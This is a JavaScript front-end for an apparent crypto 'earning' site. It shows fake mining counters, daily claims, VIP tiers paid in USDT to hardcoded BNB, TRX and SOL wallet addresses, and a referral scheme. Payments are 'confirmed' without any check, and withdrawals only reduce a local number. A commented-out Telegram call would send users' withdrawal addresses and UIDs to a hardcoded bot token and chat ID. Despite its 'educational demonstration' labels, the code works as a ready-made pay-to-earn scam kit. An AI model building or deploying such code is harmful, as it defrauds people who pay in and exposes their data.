// === JAVASCRIPT CODE ===

// DOM Elements
const navItems = document.querySelectorAll('.nav-item');
const claimBtn = document.getElementById('claimBtn');
const buyVipBtns = document.querySelectorAll('.buy-vip');
const paymentModal = document.getElementById('paymentModal');
const closePaymentBtn = document.getElementById('closePaymentBtn');
const chainOptions = document.querySelectorAll('.chain-option');
const copyAddressBtn = document.getElementById('copyAddressBtn');
const confirmPaymentBtn = document.getElementById('confirmPaymentBtn');
const withdrawBtn = document.getElementById('withdrawBtn');
const copyInviteBtn = document.getElementById('copyInviteBtn');
const submitInviteBtn = document.getElementById('submitInviteBtn');
const miningCircle = document.querySelector('.mining-circle');
const miningCore = document.querySelector('.mining-core');
const miningStatusText = document.querySelector('.mining-status-text');
const miningParticles = document.querySelectorAll('.mining-particle');

// User data
let userData = {
    balance: 0.00,
    todayEarnings: 0.00,
    totalEarned: 0.00,
    userStatus: 'free',
    dailyEarning: 0.10,
    lastClaim: null,
    vipExpiry: null,
    inviteCode: 'INVITE738225',
    invitedUsers: 0,
    miningActive: false
};

// Wallet addresses
const walletAddresses = {
    bnb: '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
    trx: 'TSKPhwUavSrKXXcbWG2TdPzYiBtoTNXP6i',
    sol: 'HvHR4LeKdCH5Z2UDKVSDuju8c4ukPAa1CzchHseZ2LKu'
};

// Telegram API (for demo purposes - in real app, use backend)
const telegramBotToken = '7659505060:AAFmwIDn2OgrtNoemPpmBWaxsIfdsQdZGCI';
const telegramChatId = '7417215529';

// Mining state
let isMining = false;
let miningInterval;
let minedAmount = 0;

// Initialize the app
document.addEventListener('DOMContentLoaded', function() {
    loadUserData();
    updateUI();
    startCountdownTimer();
    setupTabNavigation();
    initMiningAnimation();
    startBackgroundAnimations();
    
    // Show welcome modal
    setTimeout(() => {
        showWelcomeModal();
    }, 1000);
});

// Load user data from localStorage
function loadUserData() {
    const savedData = localStorage.getItem('bnbEarningUserData');
    if (savedData) {
        userData = JSON.parse(savedData);
    }
    
    // Set last claim to now if not set
    if (!userData.lastClaim) {
        userData.lastClaim = new Date().toISOString();
        saveUserData();
    }
    
    // Set invite code if not set
    if (!userData.inviteCode) {
        userData.inviteCode = 'INVITE' + Math.floor(100000 + Math.random() * 900000);
        saveUserData();
    }
}

// Save user data to localStorage
function saveUserData() {
    localStorage.setItem('bnbEarningUserData', JSON.stringify(userData));
}

// Update UI with user data
function updateUI() {
    document.getElementById('userBalance').textContent = userData.balance.toFixed(2) + ' USDT';
    document.getElementById('todayEarnings').textContent = userData.todayEarnings.toFixed(2) + ' USDT';
    document.getElementById('totalEarned').textContent = userData.totalEarned.toFixed(2) + ' USDT';
    document.getElementById('dailyEarning').textContent = userData.dailyEarning.toFixed(2) + ' USDT';
    document.getElementById('userStatus').textContent = userData.userStatus === 'free' ? 'Free User' : 'VIP User';
    document.getElementById('inviteCode').textContent = userData.inviteCode;
    document.getElementById('inviteLink').textContent = `https://bnb-earning.com/#/reg?ref=${userData.inviteCode}`;
    
    // Update VIP status display
    updateVIPStatus();
    
    // Update claim button state
    updateClaimButton();
}

// Update VIP status display
function updateVIPStatus() {
    const statusElement = document.getElementById('userStatus');
    if (userData.userStatus === 'vip') {
        statusElement.innerHTML = 'VIP User <span class="badge badge-vip">VIP</span>';
        
        // Update mining speed for VIP users
        if (userData.dailyEarning === 1.00) {
            document.getElementById('miningSpeed').textContent = '2.5 BNB/H';
        } else if (userData.dailyEarning === 7.00) {
            document.getElementById('miningSpeed').textContent = '15.0 BNB/H';
        }
    } else {
        statusElement.textContent = 'Free User';
        document.getElementById('miningSpeed').textContent = '0.5 BNB/H';
    }
}

// Update claim button based on time
function updateClaimButton() {
    const now = new Date();
    const lastClaim = new Date(userData.lastClaim);
    const timeDiff = now - lastClaim;
    const hoursDiff = timeDiff / (1000 * 60 * 60);
    
    if (hoursDiff >= 24) {
        claimBtn.disabled = false;
        claimBtn.innerHTML = '<i class="fas fa-gift"></i> Claim Daily Earnings';
        claimBtn.classList.remove('btn-disabled');
    } else {
        claimBtn.disabled = true;
        claimBtn.classList.add('btn-disabled');
        const hoursLeft = 24 - hoursDiff;
        const hours = Math.floor(hoursLeft);
        const minutes = Math.floor((hoursLeft - hours) * 60);
        claimBtn.innerHTML = `<i class="fas fa-clock"></i> Next Claim: ${hours}h ${minutes}m`;
    }
}

// Start countdown timer
function startCountdownTimer() {
    setInterval(() => {
        updateClaimButton();
        
        // Update next claim countdown
        const now = new Date();
        const lastClaim = new Date(userData.lastClaim);
        const timeDiff = now - lastClaim;
        const hoursDiff = timeDiff / (1000 * 60 * 60);
        
        if (hoursDiff < 24) {
            const hoursLeft = 24 - hoursDiff;
            const hours = Math.floor(hoursLeft);
            const minutes = Math.floor((hoursLeft - hours) * 60);
            const seconds = Math.floor(((hoursLeft - hours) * 60 - minutes) * 60);
            
            document.getElementById('nextClaim').textContent = 
                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        } else {
            document.getElementById('nextClaim').textContent = '00:00:00';
        }
        
        // Update mining stats if active
        if (isMining) {
            updateMiningStats();
        }
    }, 1000);
}

// Setup tab navigation
function setupTabNavigation() {
    navItems.forEach(item => {
        item.addEventListener('click', function() {
            // Remove active class from all items
            navItems.forEach(nav => nav.classList.remove('active'));
            
            // Add active class to clicked item
            this.classList.add('active');
            
            // Add ripple effect
            createRippleEffect(this);
            
            // Get the tab name
            const tabName = this.getAttribute('data-tab');
            
            // Show/hide sections based on tab
            document.querySelectorAll('.container > div').forEach(section => {
                if (section.classList.contains('header') || section.classList.contains('balance-card')) {
                    // Always show header and balance
                    return;
                }
                
                if (section.classList.contains(tabName + '-card')) {
                    section.style.display = 'block';
                    // Add slide in animation
                    section.style.animation = 'slideInUp 0.5s ease';
                } else {
                    section.style.display = 'none';
                }
            });
            
            // Show educational alert
            showEducationalAlert(tabName);
        });
    });
}

// Initialize mining animation
function initMiningAnimation() {
    // Set up mining button
    const miningBtn = document.getElementById('startMiningBtn');
    if (miningBtn) {
        miningBtn.addEventListener('click', function() {
            if (!isMining) {
                startMining();
            } else {
                stopMining();
            }
            
            // Add button click effect
            createButtonEffect(this);
        });
    }
}

// Start mining
function startMining() {
    isMining = true;
    
    // Update UI
    const miningBtn = document.getElementById('startMiningBtn');
    miningBtn.innerHTML = '<i class="fas fa-stop"></i> Stop Mining';
    miningBtn.classList.add('active');
    miningCircle.classList.add('active');
    miningCore.classList.add('active');
    miningStatusText.textContent = 'Mining Active';
    miningStatusText.classList.add('active');
    
    // Start mining animation
    startMiningAnimation();
    
    // Simulate mining process
    miningInterval = setInterval(() => {
        // Calculate mining rate based on user status
        let miningRate = 0.0001; // Free user
        if (userData.userStatus === 'vip') {
            if (userData.dailyEarning === 1.00) {
                miningRate = 0.001; // VIP 1
            } else if (userData.dailyEarning === 7.00) {
                miningRate = 0.005; // VIP 2
            }
        }
        
        minedAmount += miningRate;
        userData.balance += miningRate;
        userData.totalEarned += miningRate;
        
        saveUserData();
        updateUI();
        
        // Occasionally create mining effect
        if (Math.random() > 0.7) {
            createMiningEffect();
        }
        
        // Occasionally create floating coin
        if (Math.random() > 0.9) {
            createFloatingCoin();
        }
    }, 1000);
    
    showNotification('Mining started! Earning BNB...', 'success');
    sendTelegramMessage('User started mining');
}

// Stop mining
function stopMining() {
    isMining = false;
    
    // Update UI
    const miningBtn = document.getElementById('startMiningBtn');
    miningBtn.innerHTML = '<i class="fas fa-play"></i> Start Mining';
    miningBtn.classList.remove('active');
    miningCircle.classList.remove('active');
    miningCore.classList.remove('active');
    miningStatusText.textContent = 'Mining Inactive';
    miningStatusText.classList.remove('active');
    
    // Stop mining interval
    clearInterval(miningInterval);
    
    // Show mining results
    if (minedAmount > 0) {
        showNotification(`Mining completed! Earned ${minedAmount.toFixed(6)} BNB`, 'success');
        minedAmount = 0;
    }
    
    sendTelegramMessage('User stopped mining');
}

// Start mining animation
function startMiningAnimation() {
    // Add random particle effects
    miningParticles.forEach(particle => {
        particle.style.animationDelay = `${Math.random() * 2}s`;
    });
}

// Update mining stats
function updateMiningStats() {
    const miningStats = document.querySelectorAll('.mining-stats .stat-value');
    if (miningStats.length > 0) {
        miningStats[0].textContent = isMining ? 'Active' : 'Inactive';
        
        // Update mining speed based on user status
        let speed = '0.5 BNB/H';
        if (userData.userStatus === 'vip') {
            if (userData.dailyEarning === 1.00) {
                speed = '2.5 BNB/H';
            } else if (userData.dailyEarning === 7.00) {
                speed = '15.0 BNB/H';
            }
        }
        miningStats[1].textContent = speed;
    }
}

// Create mining effect
function createMiningEffect() {
    const effect = document.createElement('div');
    effect.className = 'mining-effect';
    effect.style.cssText = `
        position: absolute;
        width: 20px;
        height: 20px;
        background: var(--mining-active);
        border-radius: 50%;
        pointer-events: none;
        z-index: 100;
        animation: miningEffect 1s ease-out forwards;
    `;
    
    // Random position around mining circle
    const angle = Math.random() * Math.PI * 2;
    const radius = 60 + Math.random() * 30;
    const x = Math.cos(angle) * radius;
    const y = Math.sin(angle) * radius;
    
    effect.style.left = `calc(50% + ${x}px)`;
    effect.style.top = `calc(50% + ${y}px)`;
    
    miningCircle.appendChild(effect);
    
    // Remove effect after animation
    setTimeout(() => {
        if (effect.parentElement) {
            effect.remove();
        }
    }, 1000);
}

// Claim daily earnings
claimBtn.addEventListener('click', function() {
    if (this.disabled) return;
    
    userData.balance += userData.dailyEarning;
    userData.todayEarnings += userData.dailyEarning;
    userData.totalEarned += userData.dailyEarning;
    userData.lastClaim = new Date().toISOString();
    
    saveUserData();
    updateUI();
    
    // Show success message with animation
    showNotification(`Successfully claimed ${userData.dailyEarning} USDT!`, 'success');
    
    // Add balance update animation
    const balanceElement = document.getElementById('userBalance');
    balanceElement.style.animation = 'balanceUpdate 0.5s ease';
    
    // Send Telegram notification
    sendTelegramMessage(`User claimed ${userData.dailyEarning} USDT. New balance: ${userData.balance.toFixed(2)} USDT`);
    
    // Create coin rain effect
    createCoinRain();
});

// Buy VIP button click
buyVipBtns.forEach(btn => {
    btn.addEventListener('click', function() {
        const tier = this.getAttribute('data-tier');
        const price = this.getAttribute('data-price');
        
        // Set payment details
        document.getElementById('paymentTitle').textContent = `Buy ${tier.toUpperCase()} - ${price} USDT`;
        document.getElementById('paymentModal').setAttribute('data-tier', tier);
        document.getElementById('paymentModal').setAttribute('data-price', price);
        
        // Show payment modal
        paymentModal.style.display = 'flex';
        document.body.style.overflow = 'hidden';
        
        // Add button effect
        createButtonEffect(this);
    });
});

// Close payment modal
closePaymentBtn.addEventListener('click', function() {
    paymentModal.style.display = 'none';
    document.body.style.overflow = 'auto';
    resetPaymentModal();
    
    createButtonEffect(this);
});

// Chain option selection
chainOptions.forEach(option => {
    option.addEventListener('click', function() {
        // Remove active class from all options
        chainOptions.forEach(opt => opt.classList.remove('active'));
        
        // Add active class to clicked option
        this.classList.add('active');
        
        // Add click effect
        createButtonEffect(this);
        
        // Get chain type
        const chain = this.getAttribute('data-chain');
        
        // Show address for selected chain
        const addressDisplay = document.getElementById('addressDisplay');
        const tier = document.getElementById('paymentModal').getAttribute('data-tier');
        addressDisplay.innerHTML = `
            <strong>${chain.toUpperCase()} Address:</strong><br>
            <span style="user-select: all;">${walletAddresses[chain]}</span>
            <br><br>
            <strong>Memo/Note:</strong> ${tier}_${userData.inviteCode}
        `;
        addressDisplay.style.display = 'block';
        
        // Enable copy button
        copyAddressBtn.disabled = false;
    });
});

// Copy address to clipboard
copyAddressBtn.addEventListener('click', function() {
    const addressDisplay = document.getElementById('addressDisplay');
    const addressText = addressDisplay.textContent;
    
    navigator.clipboard.writeText(addressText).then(() => {
        showNotification('Address copied to clipboard!', 'success');
        createButtonEffect(this);
    }).catch(err => {
        showNotification('Failed to copy address', 'error');
    });
});

// Confirm payment
confirmPaymentBtn.addEventListener('click', function() {
    const tier = paymentModal.getAttribute('data-tier');
    const price = parseFloat(paymentModal.getAttribute('data-price'));
    
    // Check if user has selected a chain
    const selectedChain = document.querySelector('.chain-option.active');
    if (!selectedChain) {
        showNotification('Please select a payment method', 'error');
        return;
    }
    
    // In a real app, you would verify payment here
    // For demo, we'll just activate VIP
    activateVIP(tier, price);
    
    // Close modal
    paymentModal.style.display = 'none';
    document.body.style.overflow = 'auto';
    resetPaymentModal();
    
    createButtonEffect(this);
});

// Activate VIP
function activateVIP(tier, price) {
    userData.userStatus = 'vip';
    
    if (tier === 'vip1') {
        userData.dailyEarning = 1.00;
    } else if (tier === 'vip2') {
        userData.dailyEarning = 7.00;
    }
    
    // Set VIP expiry (30 days from now)
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + 30);
    userData.vipExpiry = expiryDate.toISOString();
    
    saveUserData();
    updateUI();
    
    // Show success message
    showNotification(`VIP activated successfully! Daily earning: ${userData.dailyEarning} USDT`, 'success');
    
    // Create celebration effect
    createCelebrationEffect();
    
    // Send Telegram notification
    sendTelegramMessage(`User purchased ${tier} for ${price} USDT. New daily earning: ${userData.dailyEarning} USDT`);
}

// Reset payment modal
function resetPaymentModal() {
    chainOptions.forEach(opt => opt.classList.remove('active'));
    document.getElementById('addressDisplay').style.display = 'none';
    copyAddressBtn.disabled = true;
}

// Withdraw funds
withdrawBtn.addEventListener('click', function() {
    const amount = parseFloat(document.getElementById('withdrawAmount').value);
    const coin = document.getElementById('withdrawCoin').value;
    const address = document.getElementById('withdrawAddress').value.trim();
    const uid = document.getElementById('withdrawUid').value.trim();
    
    // Validation
    if (!amount || amount <= 0) {
        showNotification('Please enter a valid amount', 'error');
        return;
    }
    
    if (userData.userStatus === 'free' && amount > 0.02) {
        showNotification('Free users can only withdraw up to 0.02 USDT', 'error');
        return;
    }
    
    if (userData.userStatus === 'free' && amount < 0.01) {
        showNotification('Minimum withdrawal is 0.01 USDT for free users', 'error');
        return;
    }
    
    if (amount > userData.balance) {
        showNotification('Insufficient balance', 'error');
        return;
    }
    
    if (!address) {
        showNotification('Please enter withdrawal address', 'error');
        return;
    }
    
    if (!uid) {
        showNotification('Please enter your UID', 'error');
        return;
    }
    
    // Validate address format based on coin
    if (!validateAddress(address, coin)) {
        showNotification(`Invalid ${coin.toUpperCase()} address format`, 'error');
        return;
    }
    
    // Process withdrawal (in a real app, this would be done on the server)
    userData.balance -= amount;
    saveUserData();
    updateUI();
    
    // Show success message
    showNotification(`Withdrawal request submitted for ${amount} ${coin.toUpperCase()}. Processing within 24 hours.`, 'success');
    
    // Send Telegram notification
    sendTelegramMessage(`Withdrawal request: ${amount} ${coin.toUpperCase()} to ${address} (UID: ${uid})`);
    
    // Clear form
    document.getElementById('withdrawAmount').value = '';
    document.getElementById('withdrawAddress').value = '';
    document.getElementById('withdrawUid').value = '';
    
    createButtonEffect(this);
});

// Validate cryptocurrency address
function validateAddress(address, coin) {
    switch (coin) {
        case 'bnb':
            // BNB address validation (basic)
            return address.length === 42 && address.startsWith('0x');
        case 'trx':
            // TRX address validation (basic)
            return address.length === 34 && address.startsWith('T');
        case 'sol':
            // SOL address validation (basic)
            return address.length === 44;
        case 'usdt':
            // USDT can be on multiple chains, accept any valid address
            return address.length >= 26 && address.length <= 44;
        default:
            return true;
    }
}

// Copy invite link
copyInviteBtn.addEventListener('click', function() {
    const inviteLink = document.getElementById('inviteLink').textContent;
    
    navigator.clipboard.writeText(inviteLink).then(() => {
        showNotification('Invite link copied to clipboard!', 'success');
        createButtonEffect(this);
    }).catch(err => {
        showNotification('Failed to copy invite link', 'error');
    });
});

// Submit invite code
submitInviteBtn.addEventListener('click', function() {
    const code = document.getElementById('enterInviteCode').value.trim();
    
    if (!code) {
        showNotification('Please enter an invite code', 'error');
        return;
    }
    
    // Validate code format
    if (!code.startsWith('INVITE') || code.length !== 12) {
        showNotification('Invalid invite code format', 'error');
        return;
    }
    
    // In a real app, you would validate the code on the server
    // For demo, we'll just show a success message
    showNotification('Invite code submitted successfully! Welcome bonus activated.', 'success');
    
    // Add bonus to user balance
    userData.balance += 0.50;
    saveUserData();
    updateUI();
    
    // Clear input
    document.getElementById('enterInviteCode').value = '';
    
    createButtonEffect(this);
});

// Visual effects functions
function createRippleEffect(element) {
    const ripple = document.createElement('span');
    const rect = element.getBoundingClientRect();
    const size = Math.max(rect.width, rect.height);
    const x = event.clientX - rect.left - size / 2;
    const y = event.clientY - rect.top - size / 2;
    
    ripple.style.cssText = `
        position: absolute;
        border-radius: 50%;
        background: rgba(240, 185, 11, 0.3);
        transform: scale(0);
        animation: ripple 0.6s ease-out;
        width: ${size}px;
        height: ${size}px;
        left: ${x}px;
        top: ${y}px;
        pointer-events: none;
    `;
    
    element.style.position = 'relative';
    element.style.overflow = 'hidden';
    element.appendChild(ripple);
    
    setTimeout(() => {
        ripple.remove();
    }, 600);
}

function createButtonEffect(button) {
    button.style.transform = 'scale(0.95)';
    setTimeout(() => {
        button.style.transform = 'scale(1)';
    }, 150);
}

function createCoinRain() {
    for (let i = 0; i < 15; i++) {
        setTimeout(() => {
            createFloatingCoin();
        }, i * 100);
    }
}

function createCelebrationEffect() {
    for (let i = 0; i < 20; i++) {
        setTimeout(() => {
            createFloatingCoin();
        }, i * 50);
    }
    
    // Add confetti effect
    const confetti = document.createElement('div');
    confetti.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        pointer-events: none;
        z-index: 2000;
        background: radial-gradient(circle, transparent 20%, var(--primary-color) 20%, var(--primary-color) 80%, transparent 80%);
        background-size: 50px 50px;
        animation: confetti 2s ease-out forwards;
        opacity: 0.7;
    `;
    
    document.body.appendChild(confetti);
    
    setTimeout(() => {
        confetti.remove();
    }, 2000);
}

function createFloatingCoin() {
    const coin = document.createElement('div');
    coin.className = 'coin';
    coin.textContent = 'BNB';
    coin.style.cssText = `
        position: fixed;
        color: var(--primary-color);
        font-weight: bold;
        font-size: 14px;
        opacity: 0;
        animation: float 6s linear forwards;
        left: ${Math.random() * 100}%;
        z-index: 1;
    `;
    
    document.querySelector('.floating-coins').appendChild(coin);
    
    // Remove coin after animation
    setTimeout(() => {
        coin.remove();
    }, 6000);
}

// Start background animations
function startBackgroundAnimations() {
    // Create occasional floating coins
    setInterval(() => {
        if (Math.random() > 0.8) {
            createFloatingCoin();
        }
    }, 3000);
}

// Show notification
function showNotification(message, type) {
    // Create notification element
    const notification = document.createElement('div');
    notification.className = `notification ${type === 'error' ? 'error' : ''}`;
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${type === 'success' ? 'var(--success-color)' : 'var(--danger-color)'};
        color: white;
        padding: 15px 20px;
        border-radius: 10px;
        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        z-index: 3000;
        max-width: 300px;
        animation: slideInRight 0.5s ease;
    `;
    
    notification.innerHTML = `
        <div class="notification-content">
            <i class="fas fa-${type === 'success' ? 'check' : 'exclamation'}-circle notification-icon"></i>
            <div>${message}</div>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    // Remove notification after 3 seconds
    setTimeout(() => {
        notification.style.animation = 'slideInRight 0.5s ease reverse';
        setTimeout(() => {
            notification.remove();
        }, 500);
    }, 3000);
}

// Show educational alert
function showEducationalAlert(context) {
    const messages = {
        home: "Welcome! Free users earn 0.10 USDT daily. Upgrade to VIP for higher earnings.",
        vip: "VIP members earn 1-7 USDT daily. Choose your VIP level for maximum profits.",
        withdraw: "Withdraw your earnings to any wallet. Free users: 0.02 USDT limit, VIP: No limit.",
        invite: "Invite friends and earn bonuses! Share your invite code to grow your team.",
        profile: "Manage your account settings and view your earnings history."
    };
    
    // Only show educational alerts for new users
    if (!localStorage.getItem('educationalAlertsShown')) {
        showNotification(messages[context] || "Welcome to BNB Earning Platform!", 'success');
    }
}

// Show welcome modal
function showWelcomeModal() {
    // Create welcome modal
    const welcomeModal = document.createElement('div');
    welcomeModal.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(11, 14, 17, 0.95);
        z-index: 2000;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 20px;
        animation: fadeIn 0.5s ease;
    `;
    
    welcomeModal.innerHTML = `
        <div style="background: var(--card-bg); border-radius: 20px; padding: 30px; max-width: 400px; width: 100%; box-shadow: 0 15px 40px rgba(0,0,0,0.5); border: 1px solid var(--accent-color); text-align: center; animation: modalSlideIn 0.5s ease;">
            <div style="font-size: 24px; margin-bottom: 15px; color: var(--primary-color);">
                <i class="fas fa-gem"></i>
            </div>
            <h2 style="margin-bottom: 15px; color: var(--primary-color);">Welcome to BNB Earning!</h2>
            <p style="margin-bottom: 20px; color: var(--text-secondary); line-height: 1.6;">
                Start earning cryptocurrency today!<br>
                • Free users: 0.10 USDT daily<br>
                • VIP 1: 1 USDT daily (10 USDT)<br>
                • VIP 2: 7 USDT daily (60 USDT)<br><br>
                <strong style="color: var(--text-color);">This is an educational demonstration only.</strong>
            </p>
            <button onclick="this.parentElement.parentElement.remove(); localStorage.setItem('educationalAlertsShown', 'true');" style="background: var(--primary-color); color: var(--secondary-color); border: none; padding: 12px 30px; border-radius: 10px; font-weight: 700; cursor: pointer; transition: all 0.3s ease;">
                Get Started
            </button>
        </div>
    `;
    
    document.body.appendChild(welcomeModal);
}

// Send Telegram message (simulated)
function sendTelegramMessage(message) {
    // In a real app, this would be done on the server to keep the token secure
    // For demo purposes, we'll log the message and simulate the API call
    console.log('📱 Telegram Notification:', message);
    
    // Simulate API call (commented out for security)
    /*
    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: telegramChatId,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Telegram message sent:', data);
    })
    .catch(error => {
        console.error('Error sending Telegram message:', error);
    });
    */
}

// Add dynamic styles for animations
const dynamicStyles = document.createElement('style');
dynamicStyles.textContent = `
    @keyframes confetti {
        0% {
            transform: translateY(-100%) rotate(0deg);
            opacity: 0.7;
        }
        100% {
            transform: translateY(100vh) rotate(360deg);
            opacity: 0;
        }
    }
    
    @keyframes balanceUpdate {
        0% { transform: scale(1); }
        50% { transform: scale(1.1); }
        100% { transform: scale(1); }
    }
    
    .mining-effect {
        animation: miningEffect 1s ease-out forwards;
    }
    
    @keyframes miningEffect {
        0% {
            transform: scale(1);
            opacity: 1;
        }
        100% {
            transform: scale(0);
            opacity: 0;
        }
    }
`;
document.head.appendChild(dynamicStyles);

// Export functions for global access
window.startMining = startMining;
window.stopMining = stopMining;
window.activateVIP = activateVIP;
window.showNotification = showNotification;
window.sendTelegramMessage = sendTelegramMessage;

// Console welcome message
console.log('%c🚀 BNB Earning Platform', 'color: #F0B90B; font-size: 24px; font-weight: bold;');
console.log('%cWelcome to the cryptocurrency earning platform!', 'color: #848E9C; font-size: 14px;');
console.log('%c⚠️ This is an educational demonstration only.', 'color: #F6465D; font-size: 12px;');

// Service Worker registration (for PWA capabilities)
if ('serviceWorker' in navigator) {
    window.addEventListener('load', function() {
        console.log('Service Worker would be registered here in a production app');
    });
}

// Handle page visibility changes
document.addEventListener('visibilitychange', function() {
    if (document.hidden) {
        console.log('Page hidden - activities paused');
    } else {
        console.log('Page visible - activities resumed');
    }
});

// Handle online/offline status
window.addEventListener('online', function() {
    showNotification('Connection restored', 'success');
});

window.addEventListener('offline', function() {
    showNotification('Connection lost - some features may not work', 'error');
});
